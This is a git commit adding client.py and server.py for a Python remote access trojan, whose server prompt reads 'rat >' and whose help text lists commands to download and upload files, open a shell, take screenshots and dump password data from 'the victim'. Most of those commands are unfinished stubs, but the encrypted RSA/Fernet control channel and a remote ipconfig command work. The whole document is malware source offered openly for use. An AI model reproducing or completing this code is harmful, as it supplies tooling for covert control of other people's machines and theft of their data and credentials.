b109e48d0c778ff18b8498cb45e4b8980e8d7ae8
epg1213 <epg1213@gmail.com>
2023-11-24 06:40:01 -0500

    renaming files

---
+++ client.py
@@ -0,0 +1,75 @@
+#!/usr/bin/python3
+from sys import argv
+import socket
+import rsa
+from cryptography.fernet import Fernet
+MSGLEN=2048
+from platform import system as find_system
+from subprocess import check_output
+
+class Linux:
+  def ipconfig(self):
+    return check_output(["ip", "a"]).decode('utf-8')
+
+class Windows:
+  def ipconfig(self):
+    return check_output(["ipconfig"]).decode('utf-8')
+
+class SecureSocket:
+  def __init__(self, host="127.0.0.1", port=62832):
+    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+      self.sock.connect((host, port))
+    except:
+      exit("Server unreachable.")
+    connection_key=rsa.PublicKey.load_pkcs1(self.sock.recv(2048))
+    key = Fernet.generate_key()
+    encrypted_key=rsa.encrypt(key, connection_key)
+    self.sock.send(encrypted_key)
+    self.key = Fernet(key)
+    match find_system():
+      case "Linux":
+        self.system=Linux()
+      case "Windows":
+        self.system=Windows()
+      case _:
+        exit('OS not supported.')
+
+  def send(self, message):
+    msg=self.key.encrypt(str(message).encode('utf-8'))
+    self.sock.send(msg)
+
+  def send_text(self, bytes_array):
+    self.send(len(bytes_array))
+    for line in bytes_array:
+      self.send(line)
+
+  def receive(self):
+    msg=self.sock.recv(MSGLEN)
+    message=self.key.decrypt(msg).decode('utf-8')
+    return message
+
+  def wait_for_cmd(self):
+    using=True
+    while using:
+      match self.receive():
+        case "ip":
+          self.send(self.system.ipconfig())
+        case "ho":
+          print("ho")
+        case "exit":
+          using=False
+        case _:
+          print("unknown")
+    self.sock.close()
+
+if __name__ == "__main__":
+  try:
+    port=int(argv[1])
+    if port<0 or port>65535:
+      port=62832
+  except:
+    port=62832
+  sock=SecureSocket(port=port)
+  sock.wait_for_cmd()
+  print("exit")
---
+++ server.py
@@ -0,0 +1,115 @@
+#!/usr/bin/python3
+from sys import argv
+import socket
+import rsa
+from cryptography.fernet import Fernet
+MSGLEN=2048
+
+def help():
+  print("""
+COMMANDS :
+
+  help                   Display this.
+  download [file|path]   Get a file from the victim.
+  upload   [file|path]   Put a file on the victim.
+  shell                  Start a shell on the victim.
+  ipconfig               Display the victim's IP configuration.
+  screenshot             Take a screenshot from the victim's screen.
+  search   file [path]   Find the location of a file in a directory, defaults to root directory.
+  hashdump               Dump the sensitive data about users and passwords.
+  exit                   Let the victim go.
+""")
+
+def ipconfig(victim):
+  victim.send('ip')
+  print(victim.receive())
+
+class SecureServer:
+  def __init__(self, host="127.0.0.1", port=62832):
+    self.public_key, self.private_key = rsa.newkeys(2048)
+    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    self.sock.bind((host, port))
+    self.sock.listen()
+    self.client=None
+    print(f"[*] Listening on {port}...")
+
+  def handle_client(self):
+    print("[+] Agent received !")
+    using=True
+    while using:
+      cmd=input("rat > ")
+      command=cmd.split(" ")[0]
+      match command:
+        case 'help':
+          help()
+        case 'download':
+          print('command still in dev :/')
+          #download(cmd.split(" ")[1:])
+        case 'upload':
+          print('command still in dev :/')
+          #upload(cmd.split(" ")[1:])
+        case 'shell':
+          print('command still in dev :/')
+          #shell()
+        case 'ipconfig':
+          ipconfig(self)
+        case 'screenshot':
+          print('command still in dev :/')
+          #screenshot()
+        case 'search':
+          print('command still in dev :/')
+          #search(cmd.split(" ")[1:])
+        case 'hashdump':
+          print('command still in dev :/')
+          #hashdump()
+        case '':
+          pass
+        case 'exit':
+          using=False
+        case _:
+          print(f"Unknown command : {command}")
+    self.send("exit")
+
+  def run(self):
+    running=True
+    while running:
+      print("[*] Waiting...", end="\r")
+      self.client, client_address = self.sock.accept()
+      self.client.send(self.public_key.save_pkcs1())
+      self.key=Fernet(rsa.decrypt(self.client.recv(2048), self.private_key))
+      self.handle_client()
+
+  def stop(self):
+    self.send("exit")
+    self.sock.close()
+    exit("\r Server stopped.")
+
+  def send(self, message):
+    if self.client==None:
+      return
+    msg=self.key.encrypt(str(message).encode('utf-8'))
+    self.client.send(msg)
+
+  def receive(self):
+    msg=self.client.recv(MSGLEN)
+    message=self.key.decrypt(msg).decode('utf-8')
+    return message
+
+  def get_text(self):
+    text=[]
+    for i in range(int(self.receive())):
+      print(self.receive())
+    return '\n'.join(text)
+
+if __name__ == "__main__":
+  try:
+    port=int(argv[1])
+    if port<0 or port>65535:
+      port=62832
+  except:
+    port=62832
+  server=SecureServer(port=port)
+  try:
+    server.run()
+  except KeyboardInterrupt:
+    server.stop()
